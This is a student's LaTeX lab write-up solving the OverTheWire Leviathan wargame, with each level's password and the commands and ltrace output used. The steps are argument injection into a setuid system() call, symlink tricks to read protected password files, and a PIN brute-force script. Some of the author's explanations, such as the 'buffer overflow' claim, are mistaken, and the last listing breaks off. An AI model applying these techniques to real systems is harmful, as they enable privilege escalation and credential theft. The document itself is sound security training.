\documentclass[11pt]{article}

\usepackage{graphicx}
\usepackage{framed}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{caption}
\usepackage{subcaption}

\usepackage{booktabs}
\usepackage{amsmath}

\marginparwidth 0.5in 
\oddsidemargin 0.25in 
\evensidemargin 0.25in 
\marginparsep 0.25in
\topmargin 0.25in 
\textwidth=6in
\textheight=8in

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolor}{rgb}{0.95,0.95,0.95}

\lstset{
  backgroundcolor=\color{backcolor}, % Set background color
  commentstyle=\color{codegreen}, % Style for comments
  keywordstyle=\color{magenta}, % Style for keywords
  numberstyle=\tiny\color{codegray}, % Style for line numbers
  stringstyle=\color{codepurple}, % Style for strings
  basicstyle=\ttfamily\footnotesize, % Basic font style and size
  breakatwhitespace=false, % Don't break lines at whitespace only
  breaklines=true, % Enable line breaking
  captionpos=b, % Caption position (bottom)
  keepspaces=true, % Keep spaces
  numbers=left, % Show line numbers on the left
  numbersep=5pt, % Separation of numbers from code
  showspaces=false, % Don't show spaces as visible characters
  showstringspaces=false, % Don't show spaces in strings
  showtabs=false, % Don't show tabs as visible characters
  tabsize=2, % Tab size
  % language=Python % Specify the language
}

\begin{document}
\hfill\vbox{\hbox{Jude Shin, Torrey Zachs}
		\hbox{CSC 321, Section 07}	
		\hbox{Module 6}	
		\hbox{\today}}\par

\bigskip
\centerline{\Large\bf Lab 6a: Leviathan}\par
\bigskip

This lab completes the OverTheWire CTF: Leviathan. A link to the game can be found \href{https://overthewire.org/wargames/leviathan/}{here}.

% ============================================================================

\section*{Commands, Passwords and Walk-through}
\subsection*{Level 0}
ssh into the first level with user as \verb|leviathan0| and \verb|leviathan0| as the password.

\begin{lstlisting}
ssh -p 2223 leviathan0@leviathan.labs.overthewire.org
\end{lstlisting}

\subsection*{Level 0 to Level 1}
Password: 3QJ3TgzHDq

I used the command \verb|ls -al| to try and see all of the contents in the current directory. There was an odd file called .backup with a .html file in it. Inside the file I looked for a keyword "password" and sure enough there was a section with the following contents:

\begin{lstlisting}
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
\end{lstlisting}

\subsection*{Level 1 to Level 2}
Password: NsN1HwFoyN

I used the command \verb|ls -al| to try and see all of the contents in the current directory. There was a file called \verb|check|. \verb|file check| produced the following information:

\begin{lstlisting}
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=990fa9b7d511205601669835610d587780d0195e, for GNU/Linux 3.2.0, not stripped
\end{lstlisting}

It looks like it is an executable. Running the executable \verb|./check| gave a prompt asking for a password. Putting the wrong password results in nothing, and it notifies us about it. I bet there is a static variable that it is checking. I want to see if this was written in c or compiled with gdb flags. \verb|gdb| did not give any debug flags.

I wonder if I can overflow the buffer (if it was static). I typed a very long password, and then it said that \verb|aaaaaaaaaaa [...] aaaaaaaaaaaaa command not found|. I think at a certain point it will execute a command. I don't know what permissions it will have, but hopefully I am doing something right. I am going to try and find the stopping point which the input stops being a password input and starts being a command. The following input gives the output \verb|Command 'aaa' not found, do you mean ...|

\begin{lstlisting}
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
\end{lstlisting}

So the following command should overflow something, and execute an arbitrary command:

\begin{lstlisting}
[same a's]ls
\end{lstlisting}

The ls command worked! I wonder if I can assume permissions of leviathan2 now. I remember that the /etc/bandit\_pass had the passwords that were protected per user.

\begin{lstlisting}
[same a's]cat /etc/leviathan_pass/leviathan2
\end{lstlisting}

Nope. the permission was still denied. I don't really know what I can do with executing commands. There has to be more that I can do with this buffer overflow. Any commands that I execute is just the same as me executing them directly from the terminal. What if I recursively call the \verb|.check| command?

\begin{lstlisting}
[same a's]./check
\end{lstlisting}

I wonder if there is a different command other than gdb that can trace the code that is being executed. I googled this and found ltrace. Lets run that on \verb|ltrace .check|. The output is the following:

\begin{lstlisting}
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd454, 0 <unfinished ...>
printf("password: ")                                                                                     = 10
getchar(0, 0, 0x786573, 0x646f67password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawhoami
)                                                                        = 97
getchar(0, 97, 0x786573, 0x646f67)                                                                       = 97
getchar(0, 0x6161, 0x786573, 0x646f67)                                                                   = 97
strcmp("aaa", "sex")                                                                                     = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                     = 29
+++ exited (status 0) +++
\end{lstlisting}

It seems like \verb|strcmp()| is looking to see if the word compares with "sex". Once I use this for the password, I get to a shell. I am assuming that I have privilege to see the /etc/leviathan\_pass/leviathan2. \verb|cat /etc/leviathan_pass/leviathan2| outputs the password!


\subsection*{Level 2 to Level 3}
Password: f0n8h2iWLP

I am starting again with the \verb|ls -al| command to try and see all of the contents in the current directory. There was a file called \verb|printfile|. \verb|file printfile| produced the following information:

\begin{lstlisting}
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
\end{lstlisting}

Running the file \verb|./printfile| tells me to have one of the parameters to be \verb|filename|. I tried \verb|./printfile /etc/leviathan_pass/leviathan3| and it said \verb|you can't have that file...|. I guess that would have been too easy. Lets try running \verb|ltrace| with this executable to see what libraries are called.The results are shown below:

\begin{lstlisting}
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                              = -1
puts("You cant have that file..."You cant have that file...
)                                                                       = 27
+++ exited (status 1) +++
\end{lstlisting}

I want to know what the \verb|access()| command does, because it seems to open that file with that command. \verb|man access| just checks if the person has the correct permissions. Lets try running the \verb|printfile| command on a file that I have access to. \verb|./printfile printfile| sends out some strange output that reformats the screen. I think this is because this is a binary executable with no good utf-8 encoding for the bytes in it. Lets make a text file in a temporary directory and run the file on it. 

\begin{lstlisting} 
$ mktemp -d
/tmp/tmp.pUAosgVyRa
$ touch /tmp/tmp.pUAosgVyRa/test.txt
$ echo "Hello World!" > /tmp/tmp.pUAosgVyRa/test.txt
$ ./printfile /tmp/tmp.pUAosgVyRa/test.txt
/bin/cat: /tmp/tmp.pUAosgVyRa/test.txt: Permission denied
\end{lstlisting}

It is interesting that the permission is denied from the command \verb|cat|. I am guessing that the script calls some sort of \verb|exec()| family of commands. That uses the command \verb|cat|. I am going to see what \verb|ltrace ./printfile /tmp/tmp.pUAosgVyRa/test.txt| shows me. The results are shown below:

\begin{lstlisting} 
leviathan2@leviathan:~$ ltrace ./printfile /tmp/tmp.pUAosgVyRa/test.txt
__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
access("/tmp/tmp.pUAosgVyRa/test.txt", 4)                                                                = 0
snprintf("/bin/cat /tmp/tmp.pUAosgVyRa/tes"..., 511, "/bin/cat %s", "/tmp/tmp.pUAosgVyRa/test.txt")      = 37
geteuid()                                                                                                = 12002
geteuid()                                                                                                = 12002
setreuid(12002, 12002)                                                                                   = 0
system("/bin/cat /tmp/tmp.pUAosgVyRa/tes"...Hello World!
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                   = 0
+++ exited (status 0) +++
\end{lstlisting}

I still don't know why I am getting an error on the \verb|cat| command. The parent and child should take on the same permissions as the caller. Just calling \verb|cat /tmp/tmp.pUAosgVyRa/test.txt| works just fine. Ah, but \verb|setreuid| changes the effective child processes user id. It looks like the ruid and the euid are both 12002. I want to know if there is a command that can do a reverse lookup for a uid on a system. I am going to google this. Apparently \verb|id -nu UID| finds this out. 

\begin{lstlisting}
leviathan2@leviathan:~$ id -nu 12002
leviathan2
\end{lstlisting}

Well, that is not helpful. I wonder if we can somehow overflow the buffer to change the integer from leviathan2 to leviathan3. By sheer luck, I tried 12003 instead of uid 12002, and it was leviathan3!

\begin{lstlisting}
leviathan2@leviathan:~$ id -nu 12003
leviathan3
\end{lstlisting}

So if I can somehow overflow this value to change to whatever file I want, then I can effectively \verb|cat /etc/leviathan_pass/leviathan3| and get my password. I am guessing that the two \verb|geteuid()| are the values that are used. I wonder if there is a way to change the uid that is retrieved from the command \verb|getuid|. I am off to the manpages. Nothing interesting came from that rabbit hole. 
I don't know why they used the \verb|system| call. It is weird how they put the command to be executed in quotes. Arguments are passed through spaces in the terminal, so I wonder if we are able to pass in a filename with a space in it. That will execute the \verb|cat file_one file_two|, even if out input is really "file\_one file\_two". I ran the following commands to see if I can bypass that first \verb|access| command. I'm thinking that if the single filename (that may or may not have a space in it) is made by me, then I could successfully pass the \verb|access| command, but the cat command will still treat the entries as two separate files.

\begin{lstlisting} 
$ touch "/tmp/tmp.pUAosgVyRa/foo /etc/leviathan_pass/leviathan3"
$ ./printfile /tmp/tmp.pUAosgVyRa/foo /etc/leviathan_pass/leviathan3
\end{lstlisting}

I guess this doesn't work because I can't have the \verb|\| in the filename. What if I create a symlink to the \verb|/etc/leviathan_pass/leviathan3| file, and then use that with the space separated filename. 

\begin{lstlisting} 
$ cd /tmp/tmp.pUAosgVyRa
$ ln -s /etc/leviathan_pass/leviathan3 pd 
$ touch foo
$ ./printfile "/tmp/tmp.pUAosgVyRa/foo pd"
\end{lstlisting}

I can't even seem to use /bin/cat on any file in a temp directory. It works with files like \verb|.bashrc| and even the \verb|printfile|, but not with any file in the temp directory. I am just going to make my own directory in the \verb|/tmp| directory. Here are the results of me trying to link the files again. Success! The second file that was delimited by a blank space linked to the actual password file.

\begin{lstlisting}
leviathan2@leviathan:/tmp/jude$ ls
hello.txt
leviathan2@leviathan:/tmp/jude$ ~/printfile hello.txt
Hello World!
leviathan2@leviathan:/tmp/jude$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jude/foo
leviathan2@leviathan:/tmp/jude$ touch "hello foo"
leviathan2@leviathan:/tmp/jude$ ls
foo  hello foo  hello.txt
leviathan2@leviathan:/tmp/jude$ ls -al
total 500
drwxrwxr-x    2 leviathan2 leviathan2   4096 Oct 30 04:23 .
drwxrwx-wt 6097 root       root       499712 Oct 30 04:23 ..
lrwxrwxrwx    1 leviathan2 leviathan2     30 Oct 30 04:22 foo -> /etc/leviathan_pass/leviathan3
-rw-rw-r--    1 leviathan2 leviathan2      0 Oct 30 04:23 hello foo
-rw-rw-r--    1 leviathan2 leviathan2     13 Oct 30 04:21 hello.txt
leviathan2@leviathan:/tmp/jude$ ~/printfile "hello foo"
/bin/cat: hello: No such file or directory
f0n8h2iWLP
leviathan2@leviathan:/tmp/jude$
\end{lstlisting}

It seems like when I use \verb|mktemp -d|, there were permissions that did not allow for the \verb|~/printfile| to access it's files under that directory. 


\subsection*{Level 3 to Level 4}
Password: WG1egElCvO

I am starting again with the same commands as before to see what I have to work with in this level. 

\begin{lstlisting}
leviathan3@leviathan:~$ ls -al
total 40
drwxr-xr-x   2 root       root        4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root        4096 Oct 14 09:29 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Oct 14 09:19 .bashrc
-r-sr-x---   1 leviathan4 leviathan3 18100 Oct 14 09:27 level3
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
leviathan3@leviathan:~$ file level3
level3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5f6860c1ad35cc89c2397be07b3684c8b6222d84, for GNU/Linux 3.2.0, with debug_info, not stripped
\end{lstlisting}

This seems like another password level. When I run it it asks for a password, and then tells me that I am wrong. 

\begin{lstlisting}
leviathan3@leviathan:~$ ./level3
Enter the password> a;lskdjfasdf
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ./level3
Enter the password> asdfasdfadsf
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ./level3
Enter the password> sssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$
\end{lstlisting}

I might try and use the \verb|ltrace| to trace what libraries were called in the execution of this program.

\begin{lstlisting}
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd474, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                               = -1
printf("Enter the password> ")                                                                           = 20
fgets(Enter the password> asdf
"asdf\n", 256, 0xf7fae5c0)                                                                         = 0xffffd24c
strcmp("asdf\n", "snlprintf\n")                                                                          = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                               = 19
+++ exited (status 0) +++
\end{lstlisting}

It is doing something weird with the \verb|strcmp|. I don't know what those values do, but I am hoping that the output is what we are comparing in the final \verb|strcmp|. Wait, the first \verb|strcmp| doesn't matter. It is the second one! It compares my input with the string \verb|"snlprintf"|. I am going to try that string as the input.

\begin{lstlisting}
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
WG1egElCvO
$ exit
\end{lstlisting}


\subsection*{Level 4 to Level 5}
Password: 0dyxT7F4QD

I am starting again with the same commands as before to see what I have to work with in this level. 
\begin{lstlisting}
leviathan4@leviathan:~$ ls -al
total 24
drwxr-xr-x   3 root root       4096 Oct 14 09:27 .
drwxr-xr-x 150 root root       4096 Oct 14 09:29 ..
-rw-r--r--   1 root root        220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root       3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root root        807 Mar 31  2024 .profile
dr-xr-x---   2 root leviathan4 4096 Oct 14 09:27 .trash
\end{lstlisting}

It seems like there is a binary executable in the .trash directory.
\begin{lstlisting}
leviathan4@leviathan:~$ ls -al .trash
total 24
dr-xr-x--- 2 root       leviathan4  4096 Oct 14 09:27 .
drwxr-xr-x 3 root       root        4096 Oct 14 09:27 ..
-r-sr-x--- 1 leviathan5 leviathan4 14940 Oct 14 09:27 bin
leviathan4@leviathan:~$ file .trash/bin
.trash/bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=52e379ac2e364243895250cb84038a8bf5d3e4e5, for GNU/Linux 3.2.0, not stripped
\end{lstlisting}

Trying to run the bin binary, I am met with the following output (they all seem to be deterministic runs).
\begin{lstlisting}
leviathan4@leviathan:~$ ./.trash/bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
leviathan4@leviathan:~$ ./.trash/bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
leviathan4@leviathan:~$ ./.trash/bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
\end{lstlisting}

I wonder if these translate to bytes that are ascii representations of a password. Putting it in a website () that converts from binary to ASCII/UTF-8, it produces the string \verb|"0dyxT7F4QD"|. It matches the length of the other passwords... I am going to try this on the next ssh login to see if this is the correct password. It worked!

\subsection*{Level 5 to Level 6}
Password: szo7HDB88w

I am starting again with the same commands as before to see what I have to work with in this level. 
\begin{lstlisting}
leviathan5@leviathan:~$ ls -al
total 36
drwxr-xr-x   2 root       root        4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root        4096 Oct 14 09:29 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Oct 14 09:19 .bashrc
-r-sr-x---   1 leviathan6 leviathan5 15144 Oct 14 09:27 leviathan5
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
leviathan5@leviathan:~$ file leviathan5
leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0fbe5a715bf8cd28d02bc0e989a37f9c0ab21614, for GNU/Linux 3.2.0, not stripped
\end{lstlisting}

When I tried to run the program, it froze and I had to open another shell. I am probably going to time out of that session. Maybe I can run it with \verb|ltrace| and see what is being called.

\begin{lstlisting}
...
fgetc(0x804d1a0)                                                         = '\377'
feof(0x804d1a0)                                                          = 0
putchar(0xffffffff, 0x804a008, 0, 0)                                     = 255
fgetc(0x804d1a0)                                                         = '\377'
feof(0x804d1a0)                                                          = 0
putchar(0xffffffff, 0x804a008, 0, 0)                                     = 255
fgetc(0x804d1a0)                                                         = '\377'
feof(0x804d1a0)                                                          = 0
putchar(0xffffffff, 0x804a008, 0, 0)                                     = 255
fgetc(0x804d1a0)                                                         = '\377'
feof(0x804d1a0)                                                          = 0
putchar(0xffffffff, 0x804a008, 0, 0)                                     = 255
fgetc(0x804d1a0)                                                         = '\377'
...
\end{lstlisting}

I am met with an infinity of these. Looking at the man pages, it seems like \verb|feof| returns 0 when it successfully checks the stream for an \verb|eof|. I am hoping that the while loop is being called on the 0 value that this returns. If I can change the \verb|eof|, then maybe I can break out of this loop.

\begin{lstlisting}
leviathan5@leviathan:~$ ltrace ./leviathan5 sssssssssssssssssssssssss
__libc_start_main(0x804910d, 2, 0xffffd454, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                              = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                        = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
\end{lstlisting}

I tried running the executable with the arg \verb|"ssssssssssssssssss"|, and I got this message. I am going to try and make \verb|/tmp/temp.log|.

I made a file \verb|temp.log|, and put the word \verb|"hellotherekj:w"| and when I ran the file, it printed that string, plus another extra line. I am going to run the program in \verb|ltrace| again and see what happens.
Interesting... it seems to have deleted the file because I am getting the same \verb|"file not found"| error. Lets try to make the file, put something in it, and then run the program with one argument again.

\begin{lstlisting}
leviathan5@leviathan:~$ vim /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 ssssssssssssssss
__libc_start_main(0x804910d, 2, 0xffffd454, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                              = 0x804d1a0
fgetc(0x804d1a0)                                                         = 'H'
feof(0x804d1a0)                                                          = 0
putchar(72, 0x804a008, 0, 0)                                             = 72
fgetc(0x804d1a0)                                                         = 'e'
feof(0x804d1a0)                                                          = 0
putchar(101, 0x804a008, 0, 0)                                            = 101
fgetc(0x804d1a0)                                                         = 'l'
feof(0x804d1a0)                                                          = 0
putchar(108, 0x804a008, 0, 0)                                            = 108
fgetc(0x804d1a0)                                                         = 'l'
feof(0x804d1a0)                                                          = 0
putchar(108, 0x804a008, 0, 0)                                            = 108
fgetc(0x804d1a0)                                                         = 'o'
feof(0x804d1a0)                                                          = 0
putchar(111, 0x804a008, 0, 0)                                            = 111
fgetc(0x804d1a0)                                                         = ','
feof(0x804d1a0)                                                          = 0
putchar(44, 0x804a008, 0, 0)                                             = 44
fgetc(0x804d1a0)                                                         = 'W'
feof(0x804d1a0)                                                          = 0
putchar(87, 0x804a008, 0, 0)                                             = 87
fgetc(0x804d1a0)                                                         = 'o'
feof(0x804d1a0)                                                          = 0
putchar(111, 0x804a008, 0, 0)                                            = 111
fgetc(0x804d1a0)                                                         = 'r'
feof(0x804d1a0)                                                          = 0
putchar(114, 0x804a008, 0, 0)                                            = 114
fgetc(0x804d1a0)                                                         = 'l'
feof(0x804d1a0)                                                          = 0
putchar(108, 0x804a008, 0, 0)                                            = 108
fgetc(0x804d1a0)                                                         = 'd'
feof(0x804d1a0)                                                          = 0
putchar(100, 0x804a008, 0, 0)                                            = 100
fgetc(0x804d1a0)                                                         = '!'
feof(0x804d1a0)                                                          = 0
putchar(33, 0x804a008, 0, 0)                                             = 33
fgetc(0x804d1a0)                                                         = '\n'
feof(0x804d1a0)                                                          = 0
putchar(10, 0x804a008, 0, 0Hello,World!
)                                             = 10
fgetc(0x804d1a0)                                                         = '\377'
feof(0x804d1a0)                                                          = 1
fclose(0x804d1a0)                                                        = 0
getuid()                                                                 = 12005
setuid(12005)                                                            = 0
unlink("/tmp/file.log")                                                  = 0
+++ exited (status 0) +++
\end{lstlisting}

So, it seems to print each character one at a time, and then at the end, it sets the uid to 12005 (see previous problems to see why I can assume this is the uid of leviathan5), and then \verb|unlink()|s the \verb|/tmp/file.log|. Just to confirm the uid, I performes the same commands as before:


\begin{lstlisting}
leviathan5@leviathan:~$ id -nu 12005
leviathan5
\end{lstlisting}

What if instead of making an actual file, I can create a symlink to the \verb|/etc/leviathan_pass/leviathan6| file. Then it might print out the contents!

\begin{lstlisting}
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
szo7HDB88w
\end{lstlisting}

\subsection*{Level 6 to Level 7}
Password: qEs5Io5yM8

I am starting again with the same commands as before to see what I have to work with in this level. 
\begin{lstlisting}
leviathan6@leviathan:~$ ls -al
total 36
drwxr-xr-x   2 root       root        4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root        4096 Oct 14 09:29 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Oct 14 09:19 .bashrc
-r-sr-x---   1 leviathan7 leviathan6 15036 Oct 14 09:27 leviathan6
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
leviathan6@leviathan:~$ file leviathan6
leviathan6: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e16f2bca0c05d56ab07cd7c95324355952bb3cc5, for GNU/Linux 3.2.0, not stripped
\end{lstlisting}

I am going to try and run the file.
\begin{lstlisting}
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 1234
Wrong
leviathan6@leviathan:~$ ./leviathan6 12344
Wrong
leviathan6@leviathan:~$ ./leviathan6 12
Wrong
\end{lstlisting}

I bet there is an \verb|atoi| function that converts the argument to an integer. I also think that there is going to be another int comparison or something. Hopefully I can see this in the \verb|ltrace| function.

\begin{lstlisting}
leviathan6@leviathan:~$ ltrace ./leviathan6
__libc_start_main(0x80490dd, 1, 0xffffd464, 0 <unfinished ...>
printf("usage: %s <4 digit code>\n", "./leviathan6"usage: ./leviathan6 <4 digit code>
)                     = 35
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan6@leviathan:~$ ltrace ./leviathan6 1234
__libc_start_main(0x80490dd, 2, 0xffffd464, 0 <unfinished ...>
atoi(0xffffd5d3, 0, 0, 0)                                                = 1234
puts("Wrong"Wrong
)                                                            = 6
+++ exited (status 0) +++
leviathan6@leviathan:~$ ltrace ./leviathan6 hello
__libc_start_main(0x80490dd, 2, 0xffffd464, 0 <unfinished ...>
atoi(0xffffd5d2, 0, 0, 0)                                                = 0
puts("Wrong"Wrong
)                                                            = 6
+++ exited (status 0) +++
leviathan6@leviathan:~$ ltrace ./leviathan6 world
__libc_start_main(0x80490dd, 2, 0xffffd464, 0 <unfinished ...>
atoi(0xffffd5d2, 0, 0, 0)                                                = 0
puts("Wrong"Wrong
)                                                            = 6
+++ exited (status 0) +++
\end{lstlisting}

I don't know how to go about this. There isn't really a good way to analyze like before because constant strings persisted and we could see them with other tools. I might just write a bash script to brute force the binary; there are only \verb|10\^4|. I can check to see if the output is not the word \verb|"Wrong"|, and then print out that pin which was used.

Here is the bash script that I came up with
\begin{lstlisting}
#!/bin/bash

# --- Pin Brute-Force Script ---
# This script attempts to find the correct 4-digit PIN (0000 to 9999)
# for the binary './leviathan6'.

# The script assumes:
# 1. The binary is executable and located in the current directory (./leviathan6).
# 2. A wrong attempt outputs exactly "Wrong\n" (Command substitution will capture this as "Wrong").
# 3. A correct attempt outputs anything other than "Wrong\n".

echo "Starting brute-force attack on ./leviathan6..."
START_TIME=$(date +%s)

# Loop through all numbers from 0 to 9999
for i in {0..9999}; do
    # Format the current number as a 4-digit string (e.g., 1 -> 0001)
    PIN=$(printf "%04d" "$i")

    # Run the binary and capture the output.
    # Note: Command substitution $(...) removes trailing newlines, so 
    # the "Wrong\n" output becomes just "Wrong".
    OUTPUT=$(./leviathan6 "$PIN" 2>/dev/null)

    # Check if the output is NOT the expected "Wrong" message.
    if [ "$OUTPUT" != "Wrong" ]; then
        echo -e "\n--- SUCCESS! ---"
        echo "The correct PIN is: $PIN"
        echo "Binary output was:"
        echo "$OUTPUT"
        
        END_TIME=$(date +%s)
        DURATION=$((END_TIME - START_TIME))
        echo "Found in $i attempts ($DURATION seconds)."
        
        # Stop the script once the correct PIN is found
        exit 0 
    fi

    # Optional: Print the current attempt to show progress
    # We use \r to return the carriage and overwrite the previous line
    echo -ne "Attempting PIN: $PIN \r"

done

# If the loop completes without finding the PIN
echo -e "\n\nBrute-force complete. PIN not found in range 0000-9999."
\end{lstlisting}

I made a temporary directory with \verb|mktemp -d|, made the script, performed \verb|chmod +x brute_force.sh| to make it executable, copied the original \verb|./leviathan6| file to that temporary directory. I got a pin of 7123! It puts me in a shell, and when performing \verb|cat /etc/leviathan_pass/leviathan7|, the password given is \verb|qEs5Io5yM8|.


\subsection*{Congratulations Message}
\begin{lstlisting}
leviathan7@leviathan:~$ ls -al
total 24
drwxr-xr-x   2 root       root       4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root       4096 Oct 14 09:29 ..
-rw-r--r--   1 root       root        220 Mar 31  2024 .bash_logout
